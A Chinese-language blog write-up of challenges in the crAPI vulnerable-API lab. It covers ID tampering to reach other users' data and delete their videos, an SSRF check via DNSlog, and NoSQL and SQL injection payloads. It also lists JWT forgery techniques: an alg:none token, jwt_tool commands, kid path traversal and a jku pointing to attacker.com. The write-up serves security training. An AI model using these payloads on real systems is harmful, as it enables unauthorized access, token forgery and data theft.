---
title: crapi 靶场题解
published: 2025-07-03
description: '本文内容为crapi靶场的部分题解，重点记录了接口测试方法，nosql注入以及jwt攻击的常见手段'
image: ''
tags: [接口安全]
category: '总结'
draft: false 
lang: ''
---

## 搭建本地环境

**本文采用Ubuntu 22系统搭建**

### 安装docker和docker-composer

```shell
sudo apt install docker.io -y #安装docker
sudo curl -L "https://github.com/docker/compose/releases/download/v2.6.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose #安装docker-composer
sudo chmod +x /usr/local/bin/docker-compose
sudo docker-compose version #检查版本
```

### 拉取和启动靶场

在/etc/docker/目录下管理员权限创建daemon.json文件,内容如下：

```json
{
    "registry-mirrors":
    [
        "https://docker.m.daocloud.io",
        "https://docker.hlmirror.com"
    ]
}
```

> daemon.json 文件是 Docker 的守护进程的**配置文件**，用于以 JSON 格式定义启动参数。上述文件内容用于加速docker镜像

之后运行以下命令：

```shell
sudo systemctl daemon-reload
sudo systemctl restart docker
cd ~
# 拉取靶场镜像
sudo docker-compose pull
# 启动靶场容器
sudo docker-compose -f docker-compose.yml --compatibility up -d
```

环境启动成功：

![图片 8](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713220021664.png)

访问http://IP:8888/login
进入靶场。其中IP为虚拟机IP地址。

![图片 9](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713184341911.png)

注册登录后访问 http://IP:8025/
打开邮件系统获取车辆信息，并添加到靶场中。

**本文选择Challenge1，7，11，12，13，15进行记录，其他挑战较为简单且网络资源丰富，在此不做赘述。**

## Challenge 1 访问其他用户车辆的详细信息

![image-20250713184752230](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713184754221.png)

点击其中一个条目，抓包得到如下内容：

<img src="https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713184841663.png" alt="图片 14"  />

**得到车辆敏感信息：车辆ID，vehicledid**

在车辆定位功能处，点击Refresh Location，抓包

![图片 15](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713185058311.png)

得到如下信息，发现车辆的位置信息：

![图片 16](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713185140178.png)

**修改报文中的车辆ID部分，即可访问其他车辆信息：**

![图片 17](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713185256632.png)

## Challenge 7 删除另一个用户的视频

### 找到视频API

![image-20250713185935798](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713220314135.png)

![图片 36](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190100624.png)

### 使用OPTIONS协议探测支持的http协议

![图片 37](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190231837.png)

![图片 38](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190229480.png)

### 使用DELETE删除用户视频，修改ID即可删除其他用户视频

![图片 39](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190227719.png)

![图片 40](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190225549.png)

## Challenge 11 让crAPI发送一个HTTP调用并返回HTTP响应

本节中利用**DNS log**进行测试

### 何为DNSlog

**DNSlog** 是一种常用于 **安全测试、漏洞利用和渗透测试** 中的技术工具或平台，它利用 **DNS 协议的请求可被远程服务器监控的特性**，帮助测试人员确认目标系统是否存在特定漏洞，尤其是 **命令执行、SSRF（Server-Side Request Forgery）、盲注（Blind Injection）** 等无法直接获取输出结果的漏洞。

DNSlog 通过诱导目标系统发出 DNS 请求，从而在测试者控制的 DNS 服务器上记录这些请求，以此判断目标系统是否已被成功利用。

### 工作原理

1. **攻击者**在 DNSlog 平台上注册，获得一个**唯一子域名**，比如：

   ```shell
   12345.dnslog.cn
   ```

2. 将这个子域名插入到漏洞利用的 payload 中（比如命令执行）：

   ```shell
   ping 12345.dnslog.cn
   ```

3. 如果目标服务器存在漏洞并执行了该命令，它就会尝试解析这个域名。

4. **DNSlog 平台记录下了这个 DNS 请求**，攻击者就可以确认目标系统确实执行了 payload。

### 找到接口

![image-20250713190829760](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190831532.png)

### 用DBSlog网站验证（https://dig.pm/）

![图片 55](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713190929375.png)

![图片 56](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713191007255.png)

### 成功访问

![图片 57](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713191008831.png)

## Challenge 12 在不知道优惠券代码的情况下获得免费优惠券

### 找到验证优惠券的接⼝

![image-20250713191308014](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713191310965.png)

### nosql注入

与传统 SQL 注入不同，NoSQL 注入通常利用的是 **键值对结构**、**对象表示** 或 **特殊运算符**，如 `$ne`, `$gt`, `$regex`, `$where` 等。由于很多 NoSQL 数据库（如 MongoDB）使用 JSON 格式进行查询，当用户输入未被严格校验或过滤时，攻击者可以传入复杂对象或特殊操作符，从而改变原始查询逻辑。

#### 登录认证绕过

原始查询逻辑：

```sql
db.users.findOne({ username: input_username, password: input_password })
```

攻击者提交：

```http
POST /login
username[$ne]=null&password[$ne]=null
```

**其中$ne的含义是不等于**

在解析时，中括号会被解析成一个嵌套对象，即：

```javascript
{
  username: { $ne: null },
  password: { $ne: null }
}
```

- 只要存在任何一个用户满足条件（用户名和密码都不为空），就能登录成功。

#### 正则爆破（盲注）

目标：在没有回显的情况下，枚举敏感字段如密码。

原始查询

```javascript
db.users.findOne({ username: "admin", password: input_password })
```

攻击者提交：

```http
username=admin&password[$regex]=^a
```

**其中$regex用于执行正则表达式匹配**

执行查询：

```javascript
{ username: "admin", password: { $regex: "^a" } }
```

- 如果返回为真，说明密码以 `a` 开头。攻击者可逐字符猜测密码。

#### 类型混淆注入（参数类型注入）

目标：使用非法的类型结构绕过预期逻辑。

```javascript
db.products.find({ price: req.query.price })  // 用户输入 price=100
```

**攻击者提交：**

```http
GET /products?price[$gt]=0
```

**`$gt` 表示 **“greater than”**（大于）的意思。**

查询变为：

```javascript
{ price: { $gt: 0 } }  // 返回所有价格大于0的商品
```

造成数据泄露或意外查询结果。

#### JavaScript 注入（$where 注入）

前提：MongoDB 启用了 `$where` 操作符支持 JavaScript 执行。

攻击者提交：

```http
username=admin&$where=1==1
```

查询变为*

```javascript
{
  username: "admin",
  $where: "1==1"
}
```

所有记录都被查询出，可造成越权访问。

#### 数组参数注入

场景*

```javascript
db.items.find({ category: req.query.category })  // 期望 category 是字符串
```

攻击者提交*

```http
category[$in]=electronics&category[$in]=toys
```

**`$in` 表示 “字段值在指定数组中”，即判断字段是否属于某几个值之一。**

变为：

```javascript
{ category: { $in: ["electronics", "toys"] } }
```

- 实现枚举查询，可能绕过某些权限限制。

#### MongoDB 数据写入注入

攻击者若能控制更新操作的字段名或内容，也可能造成数据破坏或提权。

```javascript
db.users.update({ username: "admin" }, { $set: req.body })
```

表示将请求体（`req.body`）里的所有字段都直接用作 **更新文档中对应字段的值**。

攻击者提交：

```json
{
  "role": "admin",
  "password": "newpass"
}
```

实现直接修改管理员权限或重置密码。

### 利用$ne实现泄露

![图片 59](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713193128625.png)

![图片 60](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713193137725.png)

## Challenge 13 找到⼀种通过修改数据库来兑换已经领取的优惠券的⽅法

```http
#申请优惠券接口
/workshop/api/shop/apply_coupon
```

![图片 61](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250713220510078.png)

后端将这个字符串直接拼接进 SQL 查询，且没有做防护，查询语句变成：

```sql
SELECT * FROM coupons WHERE coupon_code = '1'or'1'='1' AND amount = 75;
```

这里的 `'1'='1'` 总是成立，实现绕过验证。

## Challenge 15 找到伪造有效 **JWT** 令牌的⽅法

### JWT令牌

**JWT令牌（JSON Web Token）** 是一种紧凑、自包含的用于在网络应用环境间安全传递信息的标准格式。它广泛用于身份验证、授权以及信息交换。

#### JWT的组成

一个标准的JWT由三部分组成，使用点号（`.`）分隔：

```json
header.payload.signature
```

**Header**

 描述令牌类型及所用签名算法，通常是：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload**

 存放声明（Claims），即需要传递的数据，如用户ID、过期时间等。

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

**Signature**

通过对Header和Payload进行Base64Url编码后，用密钥和指定算法（如HMAC SHA256）生成签名，保证数据完整性和身份验证。

JWT常用字段（Claims）

- `iss`：发行者（issuer）
- `sub`：主题（subject）
- `aud`：受众（audience）
- `exp`：过期时间（expiration time）
- `nbf`：在此时间之前不可用（not before）
- `iat`：签发时间（issued at）
- `kid`：是 JWT和 JWKS规范中的一个关键字段，意思是 **"密钥标识符（Key ID）"**。它的作用是**指明 JWT 使用了哪把密钥进行签名**，从而帮助接收方（验证者）从一组密钥中找到正确的公钥来验证 JWT 签名。
- 自定义字段也可加入payload

#### JWT的工作流程

* 用户登录，服务器生成包含用户信息的JWT，签名后发给客户端。
* 客户端每次请求时在HTTP头部（通常是Authorization: Bearer ）携带JWT。
* 服务器验证JWT签名，确认令牌有效后，允许访问资源。

#### 具体流程

```tex
[用户输入账号密码] ---> [服务器验证成功] ---> [生成JWT并返回]
                                          |
                             客户端保存JWT（本地存储 / Cookie）
                                          |
                             所有请求加上：Authorization: Bearer <token>
                                          |
                       [服务器验证JWT签名和有效期，放行或拒绝请求]
```

当然，下面是一个完整的 **JWT 示例数据**，以及它从加密到解码的 **全过程**，包括：

- Header + Payload + Signature 三部分构成
- Base64Url 编码/解码
- 签名生成验证流程

JWT 示例：

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoxMjMsInVzZXJuYW1lIjoiYWxpY2UiLCJleHAiOjE3MDAwMDAwMDB9.
qE-yzLPTaFlp7t9pTwBtR8o7GcKvSRr9H6UzR_KrU6U
```

**Header**：说明使用的签名算法和类型
**Payload**：数据载荷，携带用户信息等
**Signature**：签名，验证 JWT 的合法性

加密流程（生成过程）

Step 1：Header

Header 是一个 JSON 对象，例如：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

用 **Base64Url** 编码后变为：

```base64
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

Step 2：Payload

Payload 是要传递的数据，比如：

```json
{
  "user_id": 123,
  "username": "alice",
  "exp": 1700000000  // 到期时间（Unix 时间戳）
}
```

Base64Url 编码为：

```base64
eyJ1c2VyX2lkIjoxMjMsInVzZXJuYW1lIjoiYWxpY2UiLCJleHAiOjE3MDAwMDAwMDB9
```

Step 3：Signature 签名生成

签名的计算方式如下：

```js
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

使用密钥 `secret = "my_secret_key"`，签名计算：

```js
HMACSHA256("eyJhbGciOi...J9.eyJ1c2Vy...MDB9", "my_secret_key")
```

输出结果为：

```text
qE-yzLPTaFlp7t9pTwBtR8o7GcKvSRr9H6UzR_KrU6U
```

最终 JWT：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoxMjMsInVzZXJuYW1lIjoiYWxpY2UiLCJleHAiOjE3MDAwMDAwMDB9.
qE-yzLPTaFlp7t9pTwBtR8o7GcKvSRr9H6UzR_KrU6U
```

解码流程

解码 JWT 主要是对前两部分（Header 和 Payload）进行 Base64Url 解码：

### 解码 Header：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### 解码 Payload：

```json
{
  "user_id": 123,
  "username": "alice",
  "exp": 1700000000
}
```

验证流程

拿到 Header + Payload，重新进行 Base64Url 编码，使用服务器端的密钥和算法对其签名，比较生成的签名是否与 JWT 中第三部分一致

如果一致 → JWT 未被篡改
如果不一致 → JWT 被伪造或篡改

### /.well-known/jwks.json 文件作用

`/.well-known/jwks.json` 是在使用 **JWT（JSON Web Token）+ 公钥加密（如 RS256）** 的系统中，常用于**公开发布验证用公钥**的一个标准路径。它是 **JWKS（JSON Web Key Set）** 的定义文件，用于让客户端或第三方获取用于验证 JWT 签名的 **公钥信息**。

目录结构说明

```http
https://<your-domain>/.well-known/jwks.json
```

这个文件的作用是提供一组公开的公钥，用于验证由该服务器签发的 JWT（通常使用 **RS256 或 ES256** 签名算法），JWT 的接收方通过解析这个 JSON 来选择合适的公钥进行验签。

示例：`jwks.json` 内容结构

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "abc123",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7...5cRQ",
      "e": "AQAB"
    }
  ]
}
```

各字段解释：

| 字段  | 含义                                     |
| ----- | ---------------------------------------- |
| `kty` | 密钥类型（如 RSA）                       |
| `kid` | 密钥ID，用于 JWT 中的 `kid` 字段与之匹配 |
| `use` | 用途，一般为 `"sig"` 表示用于签名验证    |
| `alg` | 签名算法（如 RS256）                     |
| `n`   | 模数（Base64Url 编码）                   |
| `e`   | 指数（一般为 AQAB = 65537）              |

JWT 验签流程与 JWKS 的关系

JWT 使用 **非对称加密算法**（如 RS256），由私钥签名。

接收方需要从签发者获取 **公钥** 验证签名。

JWT 中通常有一个 `kid` 字段指明该 JWT 用哪个公钥签的。

接收方访问：

```http
https://issuer.example.com/.well-known/jwks.json
```

找到匹配的 `kid`，提取 `n` 和 `e` 还原公钥。

使用该公钥验证 JWT 签名是否合法。

### 伪造有效 JWT 令牌方法

#### `alg: none` 签名绕过攻击

**攻击原理：**

JWT 的 Header 部分中有 `alg` 字段指定签名算法。如果服务端使用不安全的 JWT 库或错误配置，**可能允许不带签名的 JWT（即 alg = none）被接受**。

攻击者可以手动构造这样的 Header，使签名部分为空，但服务端依然验证通过。

**前提条件：**

- 服务端未禁用或未正确处理 `alg=none`
- 使用了早期版本或配置不当的 JWT 库（如旧版 Node.js `jsonwebtoken`）

**攻击步骤：**

将 Header 改为：

```json
{ "alg": "none", "typ": "JWT" }
```

修改 Payload（如将 `"role": "user"` 改为 `"role": "admin"`）

删除签名部分，只保留两段：

```shell
<base64url(header)>.<base64url(payload)>.
```

示例：

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

#### 弱密钥重签名（对称算法爆破）

### 攻击原理：

若服务端使用对称签名算法（如 `HS256`），攻击者可以通过**爆破或猜测弱密钥**（如 `secret`, `admin`, `password`）来伪造签名。

**前提条件：**

- 签名算法为对称算法（HS256、HS512）
- 服务端使用弱密钥
- 攻击者可获取原始 JWT（如登录后）

### 攻击步骤：

解码 JWT，读取 Header：`"alg": "HS256"`，用字典或暴力尝试猜测密钥：

```bash
jwt_tool token.jwt -C -d wordlist.txt
```

该命令将会：解码 token 的 header，查看 `alg`（一般为 `HS256`），提取签名前的数据（`header.payload`）依次尝试字典中每个密钥：

对 `header.payload` 重新计算签名（如使用 HMAC-SHA256）与原 JWT 的签名部分比对，一旦发现匹配项，输出结果

伪造 payload 并使用猜中的密钥重新签名，生成签名后，拼接成伪造 JWT。

#### 算法混淆攻击（RS256 ➝ HS256）

**攻击原理：**

RS256 是非对称算法，签名用私钥，验证用公钥；若服务端未验证算法种类，攻击者可将 `RS256` 改为 `HS256`；然后用服务器的 **公钥当作对称密钥** 重签 payload。此时，服务器错误地用公钥去做对称验证，导致签名通过。

**前提条件：**

- JWT 原使用 `RS256`（或其他非对称算法）
- 服务端未强制验证 `alg`
- 攻击者能获取服务器公钥（通过 jwks.json 或配置泄露）

**攻击步骤：**

拿到公钥（PEM格式或 JWKS）将 JWT Header 改为：

```json
{ "alg": "HS256", "typ": "JWT" }
```

使用公钥作为对称密钥，重签 payload

**示例命令（用 jwt_tool）：**

```bash
jwt_tool token.jwt -X alg=HS256 -S "-----BEGIN PUBLIC KEY-----..."
```

#### `kid`（Key ID）注入攻击

**攻击原理：**

Header 中的 `kid` 字段用于标识使用哪个密钥验证 JWT。如果服务端使用 `kid` 值从文件或远程路径中加载密钥，而没有做安全校验，则攻击者可以控制该路径，**注入文件路径或 URL 实现任意密钥加载**。

**前提条件：**

- 服务端根据 `kid` 加载密钥文件或请求 URL
- 未对 `kid` 做路径白名单或过滤

**攻击方式：**

**A. 本地路径穿越：**

```json
{ "alg": "HS256", "kid": "../../../../../tmp/evilkey" }
```

服务端从该路径加载密钥并验证伪造 token。

**B. 指向远程 JWK 服务：**

```json
{ "alg": "RS256", "jku": "https://attacker.com/evil_jwks.json" }
```

如果服务器信任 jku 指定的外部地址，即可控制验证过程。

#### JWK 混淆注入（Key Confusion）

JWK是一种基于 JSON 格式的数据结构，用于表示各种类型的密钥（包括对称密钥、公钥、私钥），便于在 Web 应用中传输和交换。正常情况下，**`jwk` 字段一般不会直接出现在 JWT 的 Header 里**，而是作为密钥管理和分发机制的一部分存在。最常见的用法是**服务器发布的 JWK 集合（JWKS）**，它是一个包含多个 JWK 的 JSON 对象，通常通过 URL 公开供客户端获取。

攻击者在 Header 中添加一个 `jwk` 字段，构造一个伪造的公钥（甚至是对称密钥），欺骗服务端直接从该 header 中提取 JWK 进行验证，**从而自己控制签名密钥**。

**示例 Header：**

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "oct",
    "k": "YmFkX21pc2tleQ"  // base64("bad_miskey")
  }
}
```

如果服务端支持从 header 中提取 jwk 并使用其中密钥，攻击者就可以伪造签名并通过验证。

#### Token 重放攻击（Replay Attack）

**攻击原理：**

JWT 本身是无状态的，一旦被窃取（如通过 XSS、Man-in-the-Middle），攻击者可以无限制使用；如果 token 没有过期时间 (`exp`)，或者没有 `jti`（JWT ID）用于黑名单机制，令牌可重复使用。

攻击方式：攻击者通过 XSS 或网络窃听拿到 victim 的 JWT，将 token 用于认证请求，系统无法区分合法与伪造请求

